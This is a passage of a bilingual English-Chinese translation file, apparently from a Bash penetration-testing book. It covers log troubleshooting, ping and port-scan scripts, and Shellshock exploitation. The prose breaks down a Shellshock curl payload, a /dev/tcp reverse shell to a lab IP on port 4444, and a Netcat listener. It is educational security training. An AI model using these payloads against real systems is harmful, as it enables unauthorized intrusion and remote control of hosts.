  zh: 如果查找失败或返回错误的结果，可能是 **/etc/resolv.conf** 中的 DNS 服务器配置存在问题，或者 DNS 服务器本身出现故障。
- en: Finally, when troubleshooting network issues, don’t forget to check the relevant
    logs for clues. On Kali and Debian, system logs are stored under the **/** **var/log**
    directory.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，在排查网络问题时，别忘了检查相关日志以寻找线索。在 Kali 和 Debian 系统中，系统日志存储在 **/var/log** 目录下。
- en: 'Key log files for networking issues include the following:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 与网络问题相关的关键日志文件包括以下内容：
- en: '**/var/log/syslog** : General system messages'
  id: totrans-118
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**/var/log/syslog** : 一般系统消息'
- en: '**/var/log/kern.log** : Kernel messages, including network driver issues'
  id: totrans-119
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**/var/log/kern.log** : 内核消息，包括网络驱动问题'
- en: '**/var/log/daemon.log** : Messages from background services'
  id: totrans-120
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**/var/log/daemon.log** : 来自后台服务的消息'
- en: '**/var/log/apache2/error.log** : Web server errors'
  id: totrans-121
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**/var/log/apache2/error.log** : Web 服务器错误'
- en: '**/var/log/mysql/error.log** : Database errors'
  id: totrans-122
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**/var/log/mysql/error.log** : 数据库错误'
- en: Use tools such as **tail** , **less** , or **grep** to view the logs and search
    for relevant messages. Let’s look at a few use cases.
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 **tail** 、**less** 或 **grep** 等工具查看日志并搜索相关信息。我们来看几个使用案例。
- en: 'For example, here’s how to view the last 100 lines of **syslog** :'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，下面是如何查看 **syslog** 中最后 100 行日志：
- en: '[PRE13]'
  id: totrans-125
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'Here’s how to search for mentions of **eth0** in **kern.log** :'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 下面是如何在 **kern.log** 中搜索 **eth0** 的相关内容：
- en: '[PRE14]'
  id: totrans-127
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'If you get an error that these log files don’t exist, your system may be using
    **journald** . To view the **journald** logs in reverse order (latest first),
    showing only errors, use the following command:'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你收到错误消息说这些日志文件不存在，系统可能正在使用 **journald**。要按逆序（最新的在前）查看 **journald** 日志并仅显示错误，可以使用以下命令：
- en: '[PRE15]'
  id: totrans-129
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: Error messages or warnings in the logs can often point you in the right direction
    for resolving the issue.
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 错误消息或日志中的警告通常能指引你解决问题的方向。
- en: By leveraging these Linux command line tools, you can methodically test and
    diagnose network issues on your Debian systems. Start by checking interface status
    with **ip** , then move on to connectivity tests with ping and traceroute. Use
    **nslookup** and **dig** to verify DNS resolution. Finally, don’t neglect to dig
    through the logs for relevant messages.
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 通过利用这些 Linux 命令行工具，你可以系统地测试和诊断 Debian 系统上的网络问题。首先使用 **ip** 检查接口状态，然后使用 ping
    和 traceroute 进行连接性测试。使用 **nslookup** 和 **dig** 验证 DNS 解析。最后，不要忽视查看日志以查找相关的消息。
- en: While it takes some practice to get proficient with these tools, learning them
    well is an invaluable skill for any pentester. They’ll enable you to quickly get
    to the bottom of complex networking problems.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然掌握这些工具需要一些实践，但学会它们对于任何渗透测试者来说都是一项无价的技能。它们将帮助你迅速找出复杂网络问题的根源。
- en: Having now thoroughly covered network interface enumeration, configuration,
    and troubleshooting, in the next section, we’ll explore using Bash scripting in
    automation for network enumeration.
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 在彻底讲解了网络接口枚举、配置和故障排除后，接下来我们将探讨如何在网络枚举中使用 Bash 脚本进行自动化。
- en: Scripting network enumeration
  id: totrans-134
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 网络枚举脚本编写
- en: As a pentester, one of the most fundamental tasks is discovering which hosts
    are active and reachable on a network. This information is crucial for mapping
    out the network topology, identifying potential targets for further testing, and
    ensuring proper network visibility. While there are many tools available for network
    discovery, sometimes the simplest and most effective approach is to write your
    own Bash scripts. In this section, we’ll explore how to leverage Bash scripting
    to discover active hosts on a network.
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 作为渗透测试者，最基本的任务之一是发现网络上哪些主机是活动的并且可达的。这些信息对于绘制网络拓扑图、识别潜在的测试目标以及确保网络可见性至关重要。虽然有很多工具可以用于网络发现，但有时最简单且最有效的方法是编写你自己的
    Bash 脚本。在本节中，我们将探讨如何利用 Bash 脚本发现网络中的活动主机。
- en: The primary goal is to determine which IP addresses on a given network respond
    to network requests, indicating that a host is active and reachable at that address.
    The most common method for network discovery is using ICMP echo requests, also
    known as *pings* . When you ping an IP address, your machine sends an ICMP echo
    request packet to that address. If a host is active at that address, it will respond
    with an ICMP echo reply packet. By systematically pinging a range of IP addresses,
    you can map out which hosts are responsive on the network.
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 主要目标是确定给定网络上的哪些 IP 地址响应网络请求，表明主机在该地址上是活动且可达的。网络发现的最常见方法是使用 ICMP 回显请求，也叫做 *ping*。当你
    ping 一个 IP 地址时，你的机器会向该地址发送一个 ICMP 回显请求包。如果该地址上的主机是活动的，它将回应一个 ICMP 回显响应包。通过系统地
    ping 一系列 IP 地址，你可以绘制出网络上哪些主机是响应的。
- en: Another approach is to scan for open ports on each IP address. If a host has
    open ports that respond to a **TCP SYN** scan or a full TCP connect scan, that
    is a strong indication that a host is active, even if it doesn’t respond to pings
    (some hosts are configured to not respond to ICMP). Common ports to check are
    **TCP 80 (HTTP)** , **443 (HTTPS)** , **22 (SSH)** , and so on depending on what
    services you expect to find on the network.
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 另一种方法是扫描每个 IP 地址的开放端口。如果某个主机有响应 **TCP SYN** 扫描或完全的 TCP 连接扫描的开放端口，即使它不响应 ping，也可以强烈表示该主机是活跃的（有些主机会被配置为不响应
    ICMP）。常见的端口包括 **TCP 80 (HTTP)**，**443 (HTTPS)**，**22 (SSH)** 等，具体端口取决于你期望在网络中找到的服务。
- en: 'You might wonder why you should bother writing Bash scripts for network discovery
    when there are plenty of existing tools such as Nmap. While those tools are certainly
    powerful and have their place, there are a few advantages to creating your own
    Bash scripts:'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能会想，既然已有很多像 Nmap 这样的工具可以用于网络发现，为什么还要写 Bash 脚本呢？虽然这些工具无疑非常强大，并且有其适用的场景，但创建自己的
    Bash 脚本也有一些优点：
- en: '**Simplicity** : Bash scripts can be very simple and concise. You can write
    a basic network discovery script in just a few lines of Bash.'
  id: totrans-139
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**简洁性** ：Bash 脚本可以非常简单和简洁。你可以用几行 Bash 编写一个基础的网络发现脚本。'
- en: '**Portability** : Bash is available on virtually every Linux/Unix system. Your
    Bash scripts can run on any machine with Bash, without needing to install additional
    tools. Eventually, you will face a scenario where you have hacked into a system
    and need to pivot from it to another network but you can’t install anything on
    the host.'
  id: totrans-140
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**便携性** ：Bash 几乎可以在每个 Linux/Unix 系统上使用。你的 Bash 脚本可以在任何安装有 Bash 的机器上运行，无需额外安装其他工具。最终，你可能会遇到这样的场景：你已经入侵了一个系统，需要从该系统转向另一个网络，但无法在主机上安装任何东西。'
- en: '**Learning** : Writing your own network discovery scripts is a great way to
    learn Bash scripting and understand the underlying process of network enumeration.'
  id: totrans-141
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**学习** ：编写你自己的网络发现脚本是学习 Bash 脚本编写的好方法，同时也能更好地理解网络枚举的底层过程。'
- en: So, let’s see how we can put Bash to work for discovering active hosts.
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 所以，让我们看看如何利用 Bash 来发现活跃的主机。
- en: 'Here’s a simple Bash one-liner to ping a range of IP addresses and print out
    the ones that respond:'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个简单的 Bash 单行命令，用来 ping 一个 IP 地址范围，并打印出响应的地址：
- en: '[PRE16]'
  id: totrans-144
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: 'Let’s break this down:'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们分解一下这个：
- en: '**for ip in 10.0.1.{1..254}; do** : This starts a **for** loop that will iterate
    over the **10.0.1.1** to **10.0.1.254** IP addresses. The **{1..254}** syntax
    is Bash brace expansion, a handy way to generate sequences.'
  id: totrans-146
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**for ip in 10.0.1.{1..254}; do** ：这会启动一个 **for** 循环，遍历 **10.0.1.1** 到 **10.0.1.254**
    的 IP 地址。**{1..254}** 是 Bash 的花括号扩展，一种生成序列的便捷方式。'
- en: '**ping -c 1 $ip** : This pings the current IP address in the loop. The **-c
    1** option specifies sending only one ping packet.'
  id: totrans-147
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**ping -c 1 $ip** ：这会对当前循环中的 IP 地址进行 ping 操作。**-c 1** 选项表示只发送一个 ping 数据包。'
- en: '**grep "64 bytes"** : This filters the ping output, only passing through lines
    that contain **"64 bytes"** , which indicates a successful ping response.'
  id: totrans-148
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**grep "64 bytes"** ：这会过滤 ping 输出，只保留包含 **"64 bytes"** 的行，表示成功的 ping 响应。'
- en: '**cut -d " " -f 4** : This cuts out the fourth field of the filtered ping output,
    which is the IP address that responded.'
  id: totrans-149
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**cut -d " " -f 4** ：这会截取过滤后的 ping 输出中的第四个字段，即响应的 IP 地址。'
- en: '**tr -d ":"** : This trims off the trailing colon from the IP address.'
  id: totrans-150
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**tr -d ":"** ：这会去掉 IP 地址末尾的冒号。'
- en: '**& done** : The **&** character at the end backgrounds each ping process,
    allowing the loop to proceed without waiting for each ping to finish. The **done**
    keyword closes the **for** loop.'
  id: totrans-151
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**& done** ：在最后加上 **&** 字符，可以将每个 ping 进程放到后台运行，允许循环在不等待每个 ping 完成的情况下继续执行。**done**
    关键字用于结束 **for** 循环。'
- en: Running this one-liner will quickly ping all 254 addresses in the **10.0.1.0/24**
    network and print out the ones that respond, giving you a list of active hosts.
    You can easily change the network by modifying the **10.0.1** part.
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 运行这个单行命令将快速 ping 完 **10.0.1.0/24** 网络中的所有 254 个地址，并打印出响应的地址，从而获得活跃主机的列表。你可以通过修改
    **10.0.1** 部分来轻松更改网络。
- en: 'Pinging is a good start, but as mentioned earlier, some hosts block pings and
    firewalls frequently restrict ping ICMP packets. A more thorough approach is to
    also scan some common ports on each IP to see whether anything responds. Here’s
    a Bash script that pings each IP and then does a quick TCP connect scan on a few
    common ports:'
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: Ping 是一个不错的起点，但如前所述，某些主机会阻止 ping，并且防火墙通常会限制 ping ICMP 数据包。一个更彻底的方法是扫描每个 IP 的一些常见端口，查看是否有响应。以下是一个
    Bash 脚本，它会先对每个 IP 地址进行 ping，然后快速扫描一些常见端口进行 TCP 连接：
- en: '[PRE17]'
  id: totrans-154
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: 'This script does the following:'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 这个脚本执行以下操作：
- en: It defines the network to scan ( **10.0.1** ) and the ports to check ( **22**
    , **80** , **443** , **445** , and **3389** ).
  id: totrans-156
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 它定义了要扫描的网络（**10.0.1**）和要检查的端口（**22**、**80**、**443**、**445** 和 **3389**）。
- en: It starts a loop over all host addresses in the **{** **1..254}** network.
  id: totrans-157
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 它开始在**{** **1..254}** 网络中的所有主机地址上循环。
- en: It pings each host. If the ping is successful (exit status **0** ), it prints
    that the host is up.
  id: totrans-158
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 它 ping 测试每个主机。如果 ping 测试成功（退出状态 **0**），则打印主机已启动。
- en: For each host, it then loops over the defined ports.
  id: totrans-159
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 对于每个主机，接着它会循环检查定义的端口。
- en: For each port, it uses the Bash **/dev/tcp** feature to attempt a TCP connection.
    The **timeout 1** command aborts the connection attempt after one second to avoid
    hanging on unresponsive ports.
  id: totrans-160
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 对于每个端口，它使用 Bash **/dev/tcp** 功能尝试建立 TCP 连接。**timeout 1** 命令在一秒后中止连接尝试，以避免在无响应的端口上挂起。
- en: If the TCP connection is successful, it prints that the port is open on the
    host.
  id: totrans-161
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果 TCP 连接成功，它会打印端口在主机上是开放的。
- en: This script provides a more comprehensive view of active hosts on the network
    by checking both ping responsiveness and open ports. You can easily customize
    the **ports** array to include any ports you want to check.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 这个脚本通过检查 ping 响应性和开放端口，提供了网络上活动主机的更全面视图。你可以轻松定制**ports**数组，以包含任何你想要检查的端口。
- en: Bash scripting provides a simple yet powerful way to discover active hosts on
    a network. With just a few lines of Bash, you can ping ranges of IP addresses,
    scan for open ports, and get a quick map of live hosts. These basic techniques
    can be extended and customized in countless ways to suit your specific needs.
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: Bash 脚本提供了一种简单而强大的方法，用于发现网络上的活动主机。只需几行 Bash 代码，你就可以 ping 测试 IP 地址范围、扫描开放端口，并快速绘制活动主机的地图。这些基本技术可以通过多种方式扩展和定制，以满足你的特定需求。
- en: Of course, for more advanced network discovery and vulnerability scanning, you’ll
    likely want to use dedicated tools such as Nmap. However, for quick checks and
    simple automation, Bash scripting is a valuable tool to have in your network testing
    toolkit. Plus, writing your own discovery scripts is a great way to sharpen your
    Bash skills and gain a deeper understanding of the network enumeration process.
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 当然，对于更高级的网络发现和漏洞扫描，你可能更倾向于使用专门的工具，如 Nmap。然而，对于快速检查和简单的自动化，Bash 脚本是你网络测试工具包中的一个宝贵工具。而且，编写自己的发现脚本是提高
    Bash 技能、加深对网络枚举过程理解的好方法。
- en: So, the next time you need to discover some hosts on a network, consider using
    your text editor to make up a Bash script. You might be surprised at how much
    you can accomplish.
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 所以下次你需要发现网络上的一些主机时，可以考虑使用文本编辑器编写一个 Bash 脚本。你可能会惊讶于自己能够完成的工作量。
- en: Having learned network enumeration in Bash, in the next section, we’ll progress
    into network exploitation.
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 学习了 Bash 中的网络枚举后，在下一部分中，我们将进入网络利用的部分。
- en: Network exploitation
  id: totrans-167
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 网络利用
- en: In this section, we’ll dive into exploiting command injection vulnerabilities
    in web applications that fail to filter user input before passing data on to operating
    system commands.
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将深入探讨如何利用 Web 应用中的命令注入漏洞，这些应用在将数据传递给操作系统命令之前未能过滤用户输入。
- en: Network service exploitation
  id: totrans-169
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 网络服务利用
- en: In September 2014, a critical vulnerability was discovered in the Unix Bash
    shell. This vulnerability, assigned the **CVE-2014-6271** identifier and nicknamed
    *Shellshock* , sent shockwaves through the information security community due
    to its severity and widespread impact. Let’s dive into the technical details of
    this vulnerability and explore how it can be exploited.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 2014 年 9 月，Unix Bash shell 中发现了一个严重漏洞。该漏洞被分配为 **CVE-2014-6271** 标识符，并被昵称为 *Shellshock*，由于其严重性和广泛影响，震动了信息安全社区。让我们深入探讨这个漏洞的技术细节，并了解它如何被利用。
- en: The Shellshock vulnerability stems from a flaw in how Bash processes environment
    variables. Specifically, it allows an attacker to execute arbitrary commands by
    manipulating environment variables in a crafted manner.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: Shellshock 漏洞源于 Bash 处理环境变量的方式存在缺陷。具体来说，它允许攻击者通过以特制方式操控环境变量来执行任意命令。
- en: 'In Bash, environment variables can be defined in the following format:'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Bash 中，环境变量可以按照以下格式定义：
- en: '[PRE18]'
  id: totrans-173
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: However, Bash also supports a feature called **function exporting** , which
    allows defining shell functions and exporting them as environment variables. The
    vulnerability arises from the fact that Bash did not properly parse and sanitize
    these function definitions.
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，Bash还支持一个名为**函数导出**的功能，允许定义shell函数并将其导出为环境变量。漏洞的产生是因为Bash未能正确解析和清理这些函数定义。
- en: 'Here’s an example of a vulnerable function definition:'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个易受攻击的函数定义示例：
- en: '[PRE19]'
  id: totrans-176
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: In this case, the **ENV** variable is defined as a function that executes the
    **echo "Malicious code"** command. The **ignored** part is used to bypass any
    preceding code that Bash may try to execute.
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 在此案例中，**ENV**变量被定义为一个执行**echo "Malicious code"**命令的函数。**ignored**部分用于绕过Bash可能尝试执行的任何前置代码。
- en: When an environment variable containing such a crafted function definition is
    passed to a Bash script or a program that invokes Bash, the malicious code within
    the function definition gets executed. This allows an attacker to inject and execute
    arbitrary commands on the targeted system.
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 当包含此类精心构造的函数定义的环境变量传递给Bash脚本或调用Bash的程序时，函数定义中的恶意代码会被执行。这使得攻击者能够注入并执行任意命令到目标系统。
- en: 'Now, let’s analyze the payload:'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们分析这个有效载荷：
- en: '[PRE20]'
  id: totrans-180
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: This payload exploits the Shellshock vulnerability to execute the **/usr/bin/id**
    command on the target system and retrieve the result.
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 这个有效载荷利用Shellshock漏洞，在目标系统上执行**/usr/bin/id**命令并获取结果。
- en: 'Here’s the command output:'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 这是命令输出：
- en: '![Figure 6.10 – The output of the Shellshock exploit](image/B22229_06_10.jpg)'
  id: totrans-183
  prefs: []
  type: TYPE_IMG
  zh: '![图6.10 – Shellshock漏洞利用的输出](image/B22229_06_10.jpg)'
- en: Figure 6.10 – The output of the Shellshock exploit
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 图6.10 – Shellshock漏洞利用的输出
- en: 'Here’s a breakdown of the payload:'
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 这是有效载荷的解析：
- en: '**curl** : This is a command-line tool for making HTTP requests.'
  id: totrans-186
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**curl** : 这是一个用于发起HTTP请求的命令行工具。'
- en: '**-A "() { ignored; };** : The **-A** option sets the user agent string for
    the HTTP request. In this case, it is set to a crafted function definition that
    exploits the Shellshock vulnerability.'
  id: totrans-187
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**-A "() { ignored; };** : **-A**选项设置HTTP请求的用户代理字符串。在这种情况下，它被设置为一个精心构造的函数定义，利用Shellshock漏洞。'
- en: '**echo Content-Type: text/plain ; echo ; echo ;** : These **echo** commands
    are used to construct a valid HTTP response header and body. They ensure that
    the response is treated as plain text and includes necessary line breaks.'
  id: totrans-188
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**echo Content-Type: text/plain ; echo ; echo ;** : 这些**echo**命令用于构建有效的HTTP响应头和正文。它们确保响应被视为纯文本，并包含必要的换行符。'
- en: '**/usr/bin/id** : This is the actual command that will be executed on the target
    system. In this case, it is the **id** command, which retrieves information about
    the current user.'
  id: totrans-189
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**/usr/bin/id** : 这是将在目标系统上执行的实际命令。在此情况下，它是**id**命令，用于检索当前用户的信息。'
- en: '**http://10.2.10.1:8080/victim.cgi** : The URL of the vulnerable **Common Gateway
    Interface** ( **CGI** ) script on the target system.'
  id: totrans-190
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**http://10.2.10.1:8080/victim.cgi** : 这是目标系统上易受攻击的**公共网关接口**（**CGI**）脚本的URL。'
- en: When this payload is sent to the vulnerable CGI script, the crafted function
    definition in the user agent string is passed as an environment variable to the
    script. Bash, which is often used to execute CGI scripts, parses the environment
    variable and executes the injected command ( **/usr/bin/id** ). The output of
    the command is then included in the HTTP response, allowing the attacker to retrieve
    the result.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 当此有效载荷被发送到易受攻击的CGI脚本时，用户代理字符串中的精心构造的函数定义会作为环境变量传递给脚本。Bash，通常用于执行CGI脚本，解析环境变量并执行注入的命令（**/usr/bin/id**）。然后，命令的输出将包含在HTTP响应中，允许攻击者获取结果。
- en: In the **curl** command we previously used to exploit Shellshock, let’s swap
    out the command with one that will make the vulnerable system connect a reverse
    shell to our IP address.
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们之前用来利用Shellshock的**curl**命令中，让我们将命令替换为一个可以使易受攻击系统连接到我们IP地址的反向Shell命令。
- en: 'Here’s our updated exploit:'
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 这是我们更新后的利用代码：
- en: '[PRE21]'
  id: totrans-194
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: 'This Bash command opens a reverse shell connection:'
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 这个Bash命令打开一个反向Shell连接：
- en: '**/bin/bash -l** : This starts a new Bash shell session as a login shell.'
  id: totrans-196
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**/bin/bash -l** : 这会启动一个新的Bash Shell会话，作为登录Shell。'
- en: '**> /dev/tcp/10.2.10.99/4444** : This redirects shell’s standard output ( **STDOUT**
    ) to a TCP connection to the **10.2.10.99** IP on port **4444** . This starts
    to make more sense once you learn that everything is a file, or appears in the
    file system, on Linux.'
  id: totrans-197
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**> /dev/tcp/10.2.10.99/4444** : 这将Shell的标准输出（**STDOUT**）重定向到一个与**10.2.10.99**
    IP地址和端口**4444**的TCP连接。一旦你知道Linux中所有内容都是文件或在文件系统中出现时，这个部分就能更容易理解了。'
- en: '**0<&1** : This redirects standard input ( **STDIN** ) to **STDOUT** , allowing
    commands sent from the remote host to be executed by the shell.'
  id: totrans-198
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**0<&1**：将标准输入（**STDIN**）重定向到**STDOUT**，使从远程主机发送的命令能够被Shell执行。'
- en: '**2>&1** : This merges standard error ( **STDERR** ) with **STDOUT** , so all
    shell output and error messages are sent to the remote host.'
  id: totrans-199
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**2>&1**：将标准错误（**STDERR**）与**STDOUT**合并，因此所有的Shell输出和错误信息都会发送到远程主机。'
- en: 'Before we execute the exploit, we must be ready to capture the reverse shell
    connection by running the following command:'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 在执行漏洞利用之前，我们必须准备好通过以下命令捕获反向Shell连接：
- en: '[PRE22]'
  id: totrans-201
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: 'Here’s the explanation:'
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 这是解释：
- en: '**nc** : This is the **Netcat** command'
  id: totrans-203
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**nc**：这是**Netcat**命令'
- en: Here’s a breakdown of the parameters **-** **nlvp 4444**
  id: totrans-204
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 下面是**-** **nlvp 4444**参数的分解
- en: '**n** : numeric-only IP addresses, no DNS'
  id: totrans-205
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**n**：仅使用数字IP地址，无DNS'
- en: '**l** : listen for inbound connections'
  id: totrans-206
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**l**：监听入站连接'
- en: '**v** : verbose'
  id: totrans-207
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**v**：详细'
- en: '**p 4444** : local port number for listener'
  id: totrans-208
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**p 4444**：监听器的本地端口号'
- en: Tip
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 提示
- en: Netcat can create almost any kind of connection you need, acting as either a
    client or a server. It’s commonly used for port scanning, transferring files,
    port listening, and even as a backdoor in pentest ing.
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: Netcat几乎可以创建你所需的任何类型的连接，既可以作为客户端，也可以作为服务器。它通常用于端口扫描、文件传输、端口监听，甚至作为渗透测试中的后门。
- en: In one terminal, I execute the Netcat command. Then, in a second terminal window,
    I execute the exploit. In the terminal where I ran the Netcat command, we see
    the connection established from **10.2.10.1** . Finally, I enter the **id** command
    to see the user that owns this shell ( **www-data** ).
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 在一个终端中，我执行Netcat命令。然后，在第二个终端窗口中，我执行漏洞利用。在执行Netcat命令的终端中，我们看到从**10.2.10.1**建立了连接。最后，我输入**id**命令来查看拥有此shell的用户（**www-data**）。
- en: You can experiment with this for yourself by downloading and running **vulhub**
    ( [https://github.com/vulhub/vulhub](https://github.com/vulhub/vulhub) ) configured
    to run **bash/CVE-2014-6271** .
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以通过下载并运行配置为执行**bash/CVE-2014-6271**的**vulhub** ([https://github.com/vulhub/vulhub](https://github.com/vulhub/vulhub))进行实验。
- en: Tip
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 提示
- en: When I’m performing pentests, I’m always on the lookout for web application
    functions that are likely to pass user-supplied input to an operating system command.
    These functions are frequently found in diagnostics testing, such as when web
    appliances have a ping or traceroute command on the diagnostics page. I also pay
    attention to any parameters that look like they could logically be performing
    an operating system command.
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: 在进行渗透测试时，我总是留意那些可能将用户提供的输入传递给操作系统命令的Web应用功能。这些功能通常出现在诊断测试中，例如Web设备的诊断页面上可能会有ping或traceroute命令。我还会注意任何看起来可能执行操作系统命令的参数。
- en: Back in 2016, I discovered two critical severity vulnerabilities in the web
    interface of a Western Digital MyCloud **Network Attached Storage** ( **NAS**
    ) device ( [https://web.archive.org/web/20170119123248/https://stevencampbell.info/2016/12/command-injection-in-western-digital-mycloud-nas/](https://web.archive.org/web/20170119123248/https://stevencampbell.info/2016/12/command-injection-in-western-digital-mycloud-nas/)
    ). The detail that caught my attention was seeing a parameter named **cmd** in
    the HTTP request data. Upon exploring further, I found that the **username** parameter
    in the cookie header and the **cmd arg** parameter in the request body were not
    properly filtering user input before passing the data to commands in the Bash
    shell. Exploiting these vulnerabilities allowed me to execute commands as the
    *root* user without authentication.
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 在2016年，我在西部数据MyCloud **网络附加存储**（**NAS**）设备的Web界面中发现了两个严重的漏洞 ([https://web.archive.org/web/20170119123248/https://stevencampbell.info/2016/12/command-injection-in-western-digital-mycloud-nas/](https://web.archive.org/web/20170119123248/https://stevencampbell.info/2016/12/command-injection-in-western-digital-mycloud-nas/))。引起我注意的细节是看到HTTP请求数据中有一个名为**cmd**的参数。进一步探索后，我发现cookie头中的**username**参数和请求体中的**cmd
    arg**参数在将数据传递给Bash shell中的命令时，没有正确过滤用户输入。利用这些漏洞，我能够在没有身份验证的情况下以*root*用户身份执行命令。
- en: During a customer pentest in 2023, I found a command injection vulnerability
    in a web application that passed user input to the ping command. After gaining
    access to the administrative interface of a web application due to default credentials,
    I quickly located the diagnostics page. The application filtered most of the characters
    required for shell command injection but overlooked shell expansion characters.
    Eventually, I found that you could send a request to the vulnerable endpoint without
    including any authentication credentials. While the application response would
    redirect you back to the login page, the response still contained the output of
    the Bash command. This resulted in an unauthenticated command injection as the
    root user.
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
